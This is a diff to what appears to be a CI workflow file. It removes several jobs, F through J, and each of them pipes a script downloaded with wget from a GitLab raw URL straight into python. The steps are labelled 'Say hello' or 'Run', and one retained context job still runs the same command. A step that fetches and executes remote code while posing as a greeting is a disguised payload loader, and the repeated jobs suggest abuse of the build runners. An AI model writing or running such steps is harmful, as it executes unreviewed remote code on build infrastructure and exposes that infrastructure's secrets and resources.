@@ -31,28 +31,3 @@ jobs:
       - uses: docker://python:latest
         name: Run
         run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
-  F:
-    steps:
-      - uses: docker://python:latest
-        name: Say hello
-        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
-  G:
-    steps:
-      - uses: docker://python:latest
-        name: Run
-        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
-  H:
-    steps:
-      - uses: docker://python:latest
-        name: Say hello
-        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
-  I:
-    steps:
-      - uses: docker://python:latest
-        name: Run
-        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
-  J:
-    steps:
-      - uses: docker://python:latest
-        name: Say hello
-        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
